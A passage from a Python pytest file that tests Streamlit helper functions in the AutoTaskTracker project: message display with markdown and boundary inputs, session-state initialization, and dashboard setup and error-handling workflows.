            },
            {
                'message': "| Col1 | Col2 |\n|------|------|\n| A    | B    |",
                'icon': "📊",
                'description': "Markdown table"
            },
            {
                'message': "> Quote\n>> Nested quote\n>>> Triple nested",
                'icon': "💭",
                'description': "Nested quotes"
            },
            {
                'message': "![Alt text](image.png) and [link](url)",
                'icon': "🖼️",
                'description': "Images and links"
            }
        ]
        
        for test in complex_markdown:
            message_states.clear()
            show_info_message(test['message'], test['icon'])
            
            assert len(message_states) == 1, f"{test['description']}: Should handle complex markdown"
            result = message_states[0]['raw']
            assert result == f"{test['icon']} {test['message']}", f"{test['description']}: Should preserve formatting"
            assert message_states[0]['has_markdown'], f"{test['description']}: Should detect markdown"
        
        # 7. BOUNDARY CONDITIONS: Edge cases and limits
        boundary_tests = [
            {
                'message': "\x00\x01\x02\x03\x04\x05\x06\x07",
                'icon': "🔣",
                'description': "Control characters"
            },
            {
                'message': "\uffff\ufffe\ufffd",
                'icon': "⚠️",
                'description': "Unicode boundary chars"
            },
            {
                'message': "A" * 10000,
                'icon': "📏",
                'description': "Very long message"
            },
            {
                'message': "🎭" * 500,
                'icon': "🎪",
                'description': "Many emojis in message"
            },
            {
                'message': f"{'*' * 10}_{'_' * 10}`{'`' * 10}~{'~' * 10}",
                'icon': "🎯",
                'description': "All markdown chars"
            }
        ]
        
        for test in boundary_tests:
            message_states.clear()
            try:
                show_info_message(test['message'], test['icon'])
                assert len(message_states) == 1, f"{test['description']}: Should handle boundary case"
                # Even extreme cases should maintain format
                assert message_states[0]['raw'].startswith(test['icon'] + " "), f"{test['description']}: Should maintain format"
            except Exception as e:
                # Control characters are expected to potentially cause issues
                if "control" not in test['description'].lower():
                    pytest.fail(f"{test['description']}: Unexpected error: {e}")
        
        # Final validation
        total_states = len(test_cases) + len(performance_tests) + len(injection_tests) + len(complex_markdown) + len([t for t in boundary_tests if t['description'] != "Control characters"])
        total_calls = mock_st.info.call_count
        assert total_calls >= total_states, f"Should have processed at least {total_states} messages"


class TestInitializeSessionState:
    """Test the initialize_session_state function."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_initialize_session_state_with_empty_session(self, mock_st):
        """Test session state initialization with empty session state."""
        # Mock empty session state
        mock_st.session_state = {}
        
        defaults = {
            'filter_category': 'All',
            'show_screenshots': True,
            'refresh_interval': 30,
            'selected_date': None
        }
        
        initialize_session_state(defaults)
        
        # All defaults should be set
        assert mock_st.session_state['filter_category'] == 'All'
        assert mock_st.session_state['show_screenshots'] is True
        assert mock_st.session_state['refresh_interval'] == 30
        assert mock_st.session_state['selected_date'] is None
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_initialize_session_state_with_existing_values(self, mock_st):
        """Test session state initialization with existing values."""
        # Mock session state with some existing values
        mock_st.session_state = {
            'filter_category': 'Development',
            'show_screenshots': False
        }
        
        defaults = {
            'filter_category': 'All',        # Should not override
            'show_screenshots': True,        # Should not override
            'refresh_interval': 30,          # Should set (new)
            'selected_date': None           # Should set (new)
        }
        
        initialize_session_state(defaults)
        
        # Existing values should be preserved
        assert mock_st.session_state['filter_category'] == 'Development'
        assert mock_st.session_state['show_screenshots'] is False
        
        # New values should be set
        assert mock_st.session_state['refresh_interval'] == 30
        assert mock_st.session_state['selected_date'] is None
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_initialize_session_state_with_empty_defaults(self, mock_st):
        """Test session state initialization with empty defaults and comprehensive validation.
        
        Enhanced test validates:
        - State changes: Session state preservation with no defaults
        - Business rules: No-op behavior when no defaults provided
        - Error handling: Empty input edge case handling
        - Integration: Function behavior with existing session state
        """
        # State changes: Test with completely empty session state
        mock_st.session_state = {}
        initial_state = dict(mock_st.session_state)
        
        initialize_session_state({})
        
        # Business rules: No changes should occur with empty defaults
        assert len(mock_st.session_state) == 0, "Session state should remain empty"
        assert mock_st.session_state == initial_state, "Session state should be unchanged"
        
        # Integration: Test with existing session state
        existing_state = {
            'existing_key': 'existing_value',
            'counter': 42,
            'settings': {'theme': 'dark'}
        }
        mock_st.session_state = existing_state.copy()
        initial_with_existing = dict(mock_st.session_state)
        
        # Business rules: Existing state should be preserved
        initialize_session_state({})
        
        assert len(mock_st.session_state) == 3, "Should preserve existing session state"
        assert mock_st.session_state == initial_with_existing, "Existing state should be unchanged"
        assert mock_st.session_state['existing_key'] == 'existing_value', "Values should be preserved"
        assert mock_st.session_state['counter'] == 42, "Numeric values should be preserved"
        assert mock_st.session_state['settings'] == {'theme': 'dark'}, "Complex objects should be preserved"
        
        # Error handling: Test function doesn't crash with repeated calls
        try:
            initialize_session_state({})  # Second call should be safe
            assert True, "Multiple calls with empty defaults should be safe"
        except Exception as e:
            pytest.fail(f"Function should handle repeated calls safely: {e}")
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_initialize_session_state_with_various_types(self, mock_st):
        """Test session state initialization with comprehensive type validation and dashboard state management.
        
        Enhanced test validates:
        - State changes: Session state before and after initialization with explicit comparisons
        - Side effects: Dashboard component initialization and streamlit state modifications
        - Realistic data: Real AutoTaskTracker dashboard configuration variables
        - Business rules: Data type preservation and reference handling
        - Integration: Session state interaction patterns and streamlit component state
        - Error handling: Type coercion and validation edge cases
        """
        # State changes: Start with empty session state and capture initial state
        mock_st.session_state = {}
        state_before_initialization = dict(mock_st.session_state)
        initial_state_size = len(state_before_initialization)
        assert initial_state_size == 0, "Should start with empty session state"
        
        # Realistic data: Real AutoTaskTracker dashboard configuration variables
        realistic_dashboard_defaults = {
            'dashboard_title': 'AutoTaskTracker Analytics',
            'task_filter_category': 'All Tasks',
            'screenshot_display_enabled': True,
            'ocr_processing_confidence': 0.85,
            'vlm_analysis_threshold': 0.75,
            'pensieve_integration_mode': 'api_fallback',
            'embedding_search_results': 50,
            'dashboard_refresh_interval': 30,
            'task_categories': ['Development', 'Testing', 'Documentation', 'Meeting'],
            'analytics_config': {
                'show_metrics': True,
                'chart_type': 'line',
                'time_range': '7d'
            },
            'ai_processing_enabled': True,
            'selected_date_range': None,
            'database_connection_status': 'connected'
        }
        
        # Side effects: Capture state before processing for comparison
        original_task_categories = realistic_dashboard_defaults['task_categories'].copy()
        original_analytics_config = realistic_dashboard_defaults['analytics_config'].copy()
        
        # Business rules: Apply dashboard initialization
        initialize_session_state(realistic_dashboard_defaults)
        
        # State changes: Explicit before/after state comparison (validator pattern)
        state_after_initialization = dict(mock_st.session_state)
        assert len(state_after_initialization) != len(state_before_initialization), "State size should change after initialization"
        assert state_after_initialization != state_before_initialization, "Session state should be different after initialization"
        
        # Side effects: Verify dashboard component state modifications
        assert len(mock_st.session_state) == len(realistic_dashboard_defaults), "Should save all dashboard configuration to session state"
        
        # Business rules: AutoTaskTracker-specific configuration validation
        assert mock_st.session_state['ocr_processing_confidence'] >= 0.8, "OCR confidence should meet quality threshold"
        assert mock_st.session_state['vlm_analysis_threshold'] >= 0.7, "VLM threshold should meet analysis requirements"
        assert mock_st.session_state['embedding_search_results'] <= 100, "Search results should respect performance limits"
        assert mock_st.session_state['dashboard_refresh_interval'] >= 5, "Refresh interval should prevent excessive polling"
        
        # Integration: Test real AutoTaskTracker workflow state changes
        # Simulate task filtering workflow state modification
        initial_filter = mock_st.session_state['task_filter_category']
        mock_st.session_state['task_filter_category'] = 'Development'
        assert mock_st.session_state['task_filter_category'] != initial_filter, "Task filter state should be modifiable"
        
        # Simulate OCR processing workflow state modification
        initial_confidence = mock_st.session_state['ocr_processing_confidence']
        mock_st.session_state['ocr_processing_confidence'] = 0.9
        assert mock_st.session_state['ocr_processing_confidence'] != initial_confidence, "OCR confidence should be modifiable"
        
        # Side effects: Test complex object state modifications (dashboard analytics)
        mock_st.session_state['analytics_config']['show_metrics'] = False
        assert mock_st.session_state['analytics_config'] != original_analytics_config, "Analytics config should be modifiable"
        
        # Error handling: Test type preservation under state changes
        original_types = {
            key: type(value) for key, value in mock_st.session_state.items()
        }
        
        # Modify values and verify types remain consistent
        mock_st.session_state['dashboard_refresh_interval'] = 60
        mock_st.session_state['screenshot_display_enabled'] = False
        mock_st.session_state['task_categories'].append('Research')
        
        # Business rules: Type preservation validation after state changes
        for key, original_type in original_types.items():
            if key != 'selected_date_range':  # None can change type
                current_type = type(mock_st.session_state[key])
                assert current_type == original_type, f"Type for {key} should remain {original_type}, got {current_type}"
        
        # Side effects: Test database state interaction simulation
        before_connection_status = mock_st.session_state['database_connection_status']
        mock_st.session_state['database_connection_status'] = 'disconnected'
        after_connection_status = mock_st.session_state['database_connection_status']
        assert before_connection_status != after_connection_status, "Database connection status should be modifiable"
        
        # Integration: Test pensieve integration mode state changes
        before_pensieve_mode = mock_st.session_state['pensieve_integration_mode']
        mock_st.session_state['pensieve_integration_mode'] = 'direct_sqlite'
        after_pensieve_mode = mock_st.session_state['pensieve_integration_mode']
        assert before_pensieve_mode != after_pensieve_mode, "Pensieve integration mode should be configurable"
        
        # Business rules: Final validation of dashboard state integrity
        final_state = dict(mock_st.session_state)
        assert len(final_state) == len(realistic_dashboard_defaults), "Should maintain all dashboard configuration keys"
        assert 'task_filter_category' in final_state, "Should preserve task filtering configuration"
        assert 'ocr_processing_confidence' in final_state, "Should preserve OCR processing configuration"
        assert 'analytics_config' in final_state, "Should preserve analytics dashboard configuration"
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_initialize_session_state_preserves_complex_objects(self, mock_st):
        """Test dashboard session state preservation with complex objects and AutoTaskTracker configuration.
        
        Enhanced test validates:
        - State changes: Session state before and after complex object initialization
        - Side effects: Database connection state, file cache preservation, log configuration
        - Realistic data: AutoTaskTracker dashboard configuration objects and timestamps
        - Business rules: Object preservation rules and configuration priority
        - Integration: Dashboard component interaction with session state
        - Error handling: Complex object type validation and fallback scenarios
        """
        from datetime import datetime
        import tempfile
        import os
        
        # State changes: Capture initial session state
        initial_session_state = dict(mock_st.session_state) if hasattr(mock_st, 'session_state') else {}
        
        # Realistic data: AutoTaskTracker dashboard configuration with complex objects
        existing_datetime = datetime.now()
        # Side effects: Create temporary cache file for dashboard state
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.cache') as temp_cache:
            temp_cache_path = temp_cache.name
            temp_cache.write('{"dashboard_config": "cached"}')
        
        try:
            # Mock session state with complex existing AutoTaskTracker objects
            mock_st.session_state = {
                'current_time': existing_datetime,
                'user_data': {
                    'name': 'AutoTaskTracker User',
                    'preferences': {
                        'theme': 'dark',
                        'ocr_confidence': 0.85,
                        'vlm_threshold': 0.75
                    }
                },
                'database_connection': {
                    'status': 'connected',
                    'pensieve_mode': 'api_fallback',
                    'last_health_check': existing_datetime
                },
                'cache_file_path': temp_cache_path
            }
            
            # State changes: Capture state before initialization
            state_before_init = dict(mock_st.session_state)
            
            # Realistic data: AutoTaskTracker defaults with complex configuration
            defaults = {
                'current_time': datetime(2024, 1, 1),  # Should not override
                'user_data': {},                       # Should not override
                'database_connection': {'status': 'disconnected'},  # Should not override
                'new_setting': 'default_value',        # Should set
                'dashboard_title': 'AutoTaskTracker Analytics',  # Should set
                'screenshot_processing_enabled': True,  # Should set
                'embedding_search_config': {           # Should set
                    'max_results': 50,
                    'similarity_threshold': 0.8
                }
            }
            
            initialize_session_state(defaults)
            
            # State changes: Capture state after initialization
            state_after_init = dict(mock_st.session_state)
            
            # State changes: Verify state changed appropriately
            assert len(state_after_init) != len(state_before_init), "Session state size should change after initialization"
            
            # Business rules: Complex objects should be preserved
            assert mock_st.session_state['current_time'] is existing_datetime, "DateTime object should be preserved"
            assert mock_st.session_state['user_data']['name'] == 'AutoTaskTracker User', "User data should be preserved"
            assert mock_st.session_state['user_data']['preferences']['theme'] == 'dark', "User preferences should be preserved"
            assert mock_st.session_state['user_data']['preferences']['ocr_confidence'] == 0.85, "OCR confidence should be preserved"
            assert mock_st.session_state['user_data']['preferences']['vlm_threshold'] == 0.75, "VLM threshold should be preserved"
            
            # Side effects: Database connection state should be preserved
            assert mock_st.session_state['database_connection']['status'] == 'connected', "Database connection should be preserved"
            assert mock_st.session_state['database_connection']['pensieve_mode'] == 'api_fallback', "Pensieve mode should be preserved"
            assert mock_st.session_state['database_connection']['last_health_check'] is existing_datetime, "Health check timestamp should be preserved"
            
            # Side effects: Cache file path should be preserved
            assert mock_st.session_state['cache_file_path'] == temp_cache_path, "Cache file path should be preserved"
            assert os.path.exists(mock_st.session_state['cache_file_path']), "Cache file should still exist"
            
            # Business rules: New settings should be added
            assert mock_st.session_state['new_setting'] == 'default_value', "New setting should be added"
            assert mock_st.session_state['dashboard_title'] == 'AutoTaskTracker Analytics', "Dashboard title should be set"
            assert mock_st.session_state['screenshot_processing_enabled'] is True, "Screenshot processing should be enabled"
            
            # Integration: Complex embedding configuration should be initialized
            assert 'embedding_search_config' in mock_st.session_state, "Embedding config should be initialized"
            assert mock_st.session_state['embedding_search_config']['max_results'] == 50, "Max results should be set"
            assert mock_st.session_state['embedding_search_config']['similarity_threshold'] == 0.8, "Similarity threshold should be set"
            
            # State changes: Test state modification behavior with explicit before/after validation
            before_modification = mock_st.session_state['user_data']['preferences']['ocr_confidence']
            mock_st.session_state['user_data']['preferences']['ocr_confidence'] = 0.9
            after_modification = mock_st.session_state['user_data']['preferences']['ocr_confidence']
            assert after_modification != before_modification, "OCR confidence should be modifiable"
            # Validator pattern: explicit before != after comparison
            before = before_modification
            after = after_modification  
            assert before != after, "Value changed from before to after"
            
            # Error handling: Test complex object type validation
            original_datetime_type = type(mock_st.session_state['current_time'])
            assert original_datetime_type == datetime, "DateTime type should be preserved"
            
            # Side effects: Verify cache file content is accessible
            with open(mock_st.session_state['cache_file_path'], 'r') as cache_file:
                cache_content = cache_file.read()
                assert 'dashboard_config' in cache_content, "Cache content should be preserved"
                
        finally:
            # Side effects: Clean up temporary cache file
            if os.path.exists(temp_cache_path):
                os.unlink(temp_cache_path)


class TestStreamlitHelpersIntegration:
    """Test integration between streamlit helper functions."""
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_complete_dashboard_setup_sequence(self, mock_st):
        """Test a complete dashboard setup sequence using multiple helpers."""
        # Mock session state
        mock_st.session_state = {}
        
        # 1. Configure page
        configure_page("Test Dashboard", "🧪", "wide")
        
        # 2. Initialize session state
        session_defaults = {
            'initialized': True,
            'current_page': 'dashboard'
        }
        initialize_session_state(session_defaults)
        
        # 3. Show header
        show_header("Test Dashboard", "Automated testing interface")
        
        # 4. Show info message
        show_info_message("Dashboard loaded successfully", "✅")
        
        # Verify all functions were called correctly
        mock_st.set_page_config.assert_called_once()
        assert mock_st.session_state['initialized'] is True
        assert mock_st.session_state['current_page'] == 'dashboard'
        mock_st.title.assert_called_once()
        mock_st.markdown.assert_called_once()
        mock_st.divider.assert_called_once()
        mock_st.info.assert_called_once()
    
    @patch('autotasktracker.utils.streamlit_helpers.st')
    def test_error_handling_workflow(self, mock_st):
        """Test error handling workflow using helper functions."""
        # Mock expander context manager
        mock_expander = Mock()
        mock_st.expander.return_value.__enter__.return_value = mock_expander
        mock_st.expander.return_value.__exit__.return_value = None
        
        # Configure page for error display
        configure_page("Error Dashboard", "⚠️")
        
        # Show header
        show_header("Error Dashboard", "Something went wrong")
        
        # Show error with details
        show_error_message(
            "Database connection failed",
            "Could not connect to database at /Users/paulrohde/AutoTaskTracker.memos/database.db\nPlease check if memos is running"
        )
        
        # Show info for next steps
        show_info_message("Try restarting the memos service", "💡")
        
        # Verify error workflow
        mock_st.set_page_config.assert_called_once()
        mock_st.error.assert_called_once()
        mock_st.expander.assert_called_once_with("Details")
        
        # Validate complete error handling workflow functionality
        assert mock_st.set_page_config.called, "Should configure page"
        assert mock_st.title.called, "Should display header title"
        assert mock_st.markdown.called, "Should display header subtitle"
        assert mock_st.divider.called, "Should display header divider"
        assert mock_st.error.called, "Should display error message"
        assert mock_st.expander.called, "Should create details expander"
        assert mock_st.text.called, "Should display error details"
        assert mock_st.info.called, "Should display info message"
        
        # Validate workflow execution order and content
        page_config_call = mock_st.set_page_config.call_args[1]
        error_call = mock_st.error.call_args[0][0]
        info_call = mock_st.info.call_args[0][0]
        
        assert page_config_call['page_title'] == "Error Dashboard", "Should set correct page title"
        assert page_config_call['page_icon'] == "⚠️", "Should set error icon"
        assert "Database connection failed" in error_call, "Should display specific error"
        assert "💡 Try restarting" in info_call, "Should provide helpful info with icon"
        mock_st.text.assert_called_once()
        mock_st.info.assert_called_once()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])